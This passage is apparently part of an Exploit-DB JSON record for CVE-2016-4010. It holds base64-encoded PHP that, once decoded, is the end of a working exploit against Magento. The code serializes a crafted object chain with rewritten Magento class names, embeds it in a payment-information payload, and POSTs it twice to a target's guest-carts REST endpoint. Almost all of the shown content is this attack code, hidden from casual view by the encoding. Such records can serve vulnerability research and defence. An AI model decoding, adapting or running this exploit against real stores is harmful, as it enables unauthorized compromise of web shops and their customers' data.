dG9fRnJhbWV3b3JrX0RCX1RyYW5zYWN0aW9uKCk7DQp9DQoNCiRyZWRpcyA9IG5ldyBDcmVkaXNfQ2xpZW50KCRyZXNvdXJjZSk7DQokc2VyaWFsaXplZCA9IHNlcmlhbGl6ZSgkcmVkaXMpOw0KDQokcGF5bG9hZCA9IGpzb25fZGVjb2RlKCd7InBheW1lbnRNZXRob2QiOnsibWV0aG9kIjoiY2hlY2ttbyIsICJhZGRpdGlvbmFsX2RhdGEiOnsiYWRkaXRpb25hbF9pbmZvcm1hdGlvbiI6IiJ9fSwgImVtYWlsIjogInZhbGlkQG1hZ2VudG8uY29tIn0nKTsNCg0KJHBheWxvYWQtPnBheW1lbnRNZXRob2QtPmFkZGl0aW9uYWxfZGF0YS0+YWRkaXRpb25hbF9pbmZvcm1hdGlvbiA9IHN0cl9yZXBsYWNlKCdNYWdlbnRvX0ZyYW1ld29ya19EQl9UcmFuc2FjdGlvbicsICdNYWdlbnRvXFxGcmFtZXdvcmtcXERCXFxUcmFuc2FjdGlvbicsIHN0cl9yZXBsYWNlKCdNYWdlbnRvX1NhbGVzX01vZGVsX09yZGVyX1BheW1lbnRfVHJhbnNhY3Rpb24nLCAnTWFnZW50b1xcU2FsZXNcXE1vZGVsXFxPcmRlclxcUGF5bWVudFxcVHJhbnNhY3Rpb24nLCBzdHJfcmVwbGFjZSgnTWFnZW50b19GcmFtZXdvcmtfU2ltcGxleG1sX0NvbmZpZ19DYWNoZV9GaWxlJywgJ01hZ2VudG9cXEZyYW1ld29ya1xcU2ltcGxleG1sXFxDb25maWdcXENhY2hlXFxGaWxlJywgJHNlcmlhbGl6ZWQpKSk7DQoNCmZvcigkaT0wOyAkaTwyOyAkaSsrKXsNCiAgICAkYyA9IGN1cmxfaW5pdCgkYXJndlsxXS4nL3Jlc3QvVjEvZ3Vlc3QtY2FydHMvJy4kYXJndlsyXS4nL3NldC1wYXltZW50LWluZm9ybWF0aW9uJyk7DQogICAgY3VybF9zZXRvcHQoJGMsIENVUkxPUFRfSFRUUEhFQURFUiwgYXJyYXkoJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicpKTsNCiAgICBjdXJsX3NldG9wdCgkYywgQ1VSTE9QVF9QT1NURklFTERTLCBqc29uX2VuY29kZSgkcGF5bG9hZCkpOw0KICAgIGN1cmxfZXhlYygkYyk7DQogICAgY3VybF9jbG9zZSgkYyk7DQp9DQoNCj8+", 
    "filename": "platforms/php/webapps/39838.php", 
    "id": "39838", 
    "cves": [
        "CVE-2016-4010"
    ]
}